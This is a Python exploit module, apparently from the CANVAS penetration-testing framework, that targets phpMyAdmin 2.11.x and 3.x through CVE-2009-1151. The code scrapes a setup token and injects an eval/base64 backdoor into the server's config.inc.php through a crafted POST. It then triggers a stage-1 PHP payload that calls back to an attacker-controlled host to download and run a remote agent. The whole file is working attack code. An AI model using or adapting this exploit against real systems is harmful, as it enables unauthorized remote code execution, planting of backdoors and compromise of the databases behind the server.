#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit
import libs.spkproxy as spkproxy #for urlopen
import re

NAME="phpmyadmin_injection"
DESCRIPTION="phpMyAdmin PHP injection 2.11.x - 2.11.9.4 and 3.x - 3.1.3.0"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']        = "http://www.phpmyadmin.net"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"]    = "http://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php"
DOCUMENTATION["CVE Name"]      = "CVE-2009-1151"
DOCUMENTATION["CVE URL"]       = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1151"
DOCUMENTATION['CVSS'] = 7.5
DOCUMENTATION["Notes"]         = """This exploit requires that the "/config/ directory was not deleted after installation.  Basic authorization may also be needed to reach the phpMyAdmin interface"""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

import urllib, time
from phplistener import get_php_stage1 #get our "Shellcode" 

NOTES="""
Tested on phpMyAdmin 2.11.9.2 and 2.11.9.4.
"""

CHANGELOG="""
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.port               = 80
        self.host               = ""
        self.badstring          = "\x00"
        self.setVersions()
        self.version            = 0
        self.done               = 0
        self.name               = NAME    
        self.basepath           = "/phpmyadmin"
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.hostname           = ""
        self.setupfile          = "/scripts/setup.php"
        self.configfile         = "/config/config.inc.php"

        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host               = self.target.interface
        self.hostname           = self.argsDict.get("hostname", self.hostname)
        self.port               = int(self.argsDict.get("port",self.port))
        self.basepath           = self.argsDict.get("basepath", self.basepath)
        self.ssl                = self.argsDict.get("ssl",self.ssl)
        self.basicauth_user     = self.argsDict.get("username", self.basicauth_user)
        self.basicauth_password = self.argsDict.get("password", self.basicauth_password)

        """
        if self.hostname in [None, ""]:
            allhosts=self.target.get_knowledge("www_hostnames")
            if allhosts==None:
                allhosts=["%s"%self.host]
        else:
            allhosts=[self.hostname]
        self.allhosts=allhosts
        """
        self.allhosts=[self.hostname]
        return 

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[1]=[""]

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.PHPMULTI]

    def test(self):
        """
        Quicky banner check - looks for comon basepaths
        """    
        self.getargs()
        self.log("Using basepath=%s"%self.basepath)
        self.log("Using vhost=%s"%self.hostname)
        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        for hostname in self.allhosts:
            self.log("Testing hostname: %s"%hostname)

            #automatically check out some common basepaths, starting with the one specified
            for basepath in [self.basepath, "/", "/phpmyadmin"]:
                self.log("Testing for basepath: %s"%basepath)

                #If we have to do basic-auth, let's get an object from spkproxy here
                if self.basicauth_user !="":
                    auth=spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
                else:
                    auth=None 

                fd=spkproxy.urlopen(protocol+"://"+self.host+":%s"%self.port+"/"+basepath, hostname=hostname, exploit=self, auth=auth)
                data=fd.read()

                #now that we have the web page - we parse it and look for vulnerable versions
                #list of vulnerable versions so far
                for s in ["phpmyadmin"]:
                    #self.log("Data=%s"%data) #print out web page (big)
                    if s in data:
                        self.log("Found phpMyAdmin in vhost %s at basepath %s"%(hostname, basepath))
                        self.argsDict["basepath"]=basepath
                        self.basepath=basepath
                        self.hostname=hostname
                        self.version=1
                        return 1
        return 0



    def run(self):
        self.getargs()
        #test = self.test()
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.hostname,self.port))

        self.log("Attacking %s:%d"%(self.hostname,self.port))
        #self.log("Basic Auth User: %s"%self.basicauth_user)
        self.log("VHost: %s"%self.hostname)
        if self.ssl:
            protocol="https"
        else:
            protocol="http"

        #If we have to do basic-auth, let's get an object from spkproxy here
        if self.basicauth_user !="":
            auth=spkproxy.BasicAuth(self.basicauth_user,self.basicauth_password)
        else:
            auth=None

        useragentstring=protocol+"://"+self.host+":%s"%self.port+"/"+self.basepath    
        self.log("useragentstring: %s"%useragentstring)



        UA=spkproxy.UserAgent(useragentstring, auth=auth, hostname=self.hostname, exploit=self)
        response = UA.GET(self.setupfile)
        #<input type="hidden" name="token" value="aa96b8c97b4908d5cddcdcdddc83d211" />
        response = response.split(" ")
        try:
            tokenpos = response.index("name=\"token\"")
            token    = response[tokenpos+1].strip("\"").strip("value=\"")
            self.log("Found valid token to use: %s"%token)
        except ValueError:
            self.log("No usable token found.  Will not proceed with attack")
            return 0

        #manually encoded this stuff because urllib.quote_plus was having a bad day ...
        command=""":%22host%27%5d=%27%27%3b%20if($_GET%5b%27s%27%5d){eval(base64_decode($_GET%5b%27s%27%5d))%3b}%3b"""
        commandlen= len(urllib.unquote(command))

        poststuff="""token=%s&action=save&configuration=a:1:{s:7:%%22Servers%%22%%3ba:1:{i:0%%3ba:6:{s:%s%s//%%22%%3bs:9:%%22localhost%%22%%3bs:9:%%22extension%%22%%3bs:6:%%22mysqli%%22%%3bs:12:%%22connect_type%%22%%3bs:3:%%22tcp%%22%%3bs:8:%%22compress%%22%%3bb:0%%3bs:9:%%22auth_type%%22%%3bs:6:%%22config%%22%%3bs:4:%%22user%%22%%3bs:4:%%22root%%22%%3b}}}&eoltype=unix"""%(token, commandlen, command)
        #push the eval() code into the config.inc.php file
        response=UA.POST(self.setupfile, poststuff, noresponse=False)                 

        #get a shell!
        response = UA.GET(self.configfile+"?s=%s"%b64encode(self.get_php_to_mosdef()).strip(),noresponse=True)

        for i in xrange(0,3): #wait three seconds for callback
            time.sleep(1)
            ret=self.ISucceeded()
            if ret:
                break

        if ret:
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
        return ret

    def get_php_to_mosdef(self):
        """
        Creates a string which when included in php's eval() will download and execute
        MOSDEF
        """

        localhost=self.callback.ip
        localport=self.callback.port
        self.log("Using PHPMULTI callback of %s:%d"%(localhost,localport))

        badchars="" #none for this one
        ret=get_php_stage1(badchars,localhost,localport)

        return ret

    def shutdown(self):
        self.done=1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

